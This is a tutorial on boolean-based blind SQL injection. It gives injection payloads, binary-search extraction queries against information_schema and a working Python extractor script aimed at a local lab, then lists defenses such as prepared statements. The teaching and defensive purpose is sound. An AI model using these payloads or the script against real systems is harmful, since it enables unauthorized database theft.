---
title: "Boolean-Based Blind SQL Injection"
tags: ["security-basics", "sqli", "web-security"]
---

# Boolean-Based Blind SQL Injection

**TL;DR** — When a page shows no query results and no database errors, you can
still read the whole database using one bit at a time: does the page look like the
"true" response or the "false" one? Combine that bit with a binary search over
character codes and you recover any value. "No errors" is not a defense.

## The setup

Most pages that take a parameter run a query behind the scenes:

```sql
-- GET /profile?id=1
SELECT name, bio FROM users WHERE id = 1;
```

If `id` is concatenated into the query, you can inject. In a blind case the page
never prints query output or errors — but it still behaves differently for a true
condition than a false one. That difference is the only channel you need.

## The true/false oracle

Inject a condition that is always true, then one that is always false, and compare
the responses:

```sql
-- true: page renders normally
GET /profile?id=1 AND 1=1--
-- false: WHERE becomes false, zero rows, "not found"
GET /profile?id=1 AND 1=2--
```

Different responses for `1=1` versus `1=2` confirm boolean-based SQLi. The
"difference" can be any observable: body text, status code, response length, or
presence of an element.

For a string column wrapped in quotes (`WHERE name='alice'`), balance the quotes:
`alice' AND '1'='1`.

Comment syntax by engine: `-- ` or `#` (MySQL), `--` (PostgreSQL, SQLite,
SQL Server).

## Reading data with binary search

To turn one true/false bit into real data, compare character codes with
`SUBSTRING` and `ASCII`:

```sql
-- is the first character of the DB name > 79 (ASCII)?
AND ASCII(SUBSTRING(database(), 1, 1)) > 79
```

Printable ASCII runs 32–126, so a binary search pins one character in at most 7
requests. Recovering the code for 'd' (100):

| Step | Range | Midpoint | Query | Result |
|---|---|---|---|---|
| 1 | 32–126 | 79 | > 79 ? | true -> 80–126 |
| 2 | 80–126 | 103 | > 103 ? | false -> 80–103 |
| 3 | 80–103 | 91 | > 91 ? | true -> 92–103 |
| 4 | 92–103 | 97 | > 97 ? | true -> 98–103 |
| 5 | 98–103 | 100 | > 100 ? | false -> 98–100 |
| 6 | 98–100 | 99 | > 99 ? | true -> 100 |

Six requests for one character. Point the same technique at
`information_schema` to walk the database: database name, then table names, then
column names, then the rows themselves.

```sql
-- first table in the current database
SELECT table_name FROM information_schema.tables
WHERE table_schema = database() LIMIT 0,1

-- wrapped into a boolean query
AND ASCII(SUBSTRING(
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema = database() LIMIT 0,1), 1, 1)) > 79
```

## Automating it

By hand this is thousands of requests, so it is always automated. A minimal
extractor (for a lab you own, such as DVWA):

```python
import requests, time

TARGET, PARAM, BASE_ID = "http://localhost/profile", "id", "1"
TRUE_STR = "user found"   # a string present only in the true response
DELAY = 0.05

def inject(condition):
    payload = f"{BASE_ID} AND {condition}-- -"
    r = requests.get(TARGET, params={PARAM: payload}, timeout=10)
    time.sleep(DELAY)
    return TRUE_STR in r.text

def get_length(expr):
    lo, hi = 1, 100
    while lo < hi:
        mid = (lo + hi) // 2
        if inject(f"LENGTH(({expr}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_char(expr, pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if inject(f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo > 32 else ""

def extract(expr):
    return "".join(get_char(expr, i) for i in range(1, get_length(expr) + 1))

if __name__ == "__main__":
    print(extract("SELECT database()"))
```

In practice, `sqlmap --technique=B` does the same thing with far better handling
of edge cases. Understanding the manual oracle is what lets you tune the tool when
it stalls.

Run tools and scripts like this only against systems you own or are explicitly
authorized to test — a lab such as DVWA or WebGoat, a CTF, or an in-scope target.

## Why it is dangerous

- No database error is logged, so it can slip past log-based detection.
- Run slowly and under rate limits, it blends into normal traffic.
- Once a scanner confirms the oracle, the whole database can be dumped unattended.

## Defense

The same controls as any SQLi, because the root cause is identical:

1. **Prepared statements** — the single most important control; input can never be
   parsed as SQL.
2. **Type and format validation** — IDs are integers, emails are emails.
3. **ORM / query builders** — they parameterize by default; be careful with raw
   queries.
4. **Least privilege** on the database account.
5. **Suppress database errors** in production.
6. **WAF** as one layer, never the only one.
7. **Rate limiting and anomaly detection** — boolean-based attacks are
   request-heavy; flag abnormal request rates from one source.

## Takeaway

Boolean-based SQLi needs no errors and no visible output — only a response that
differs between true and false. With binary search that single bit recovers any
value in the database. "We hide errors" slows it down; prepared statements stop
it.
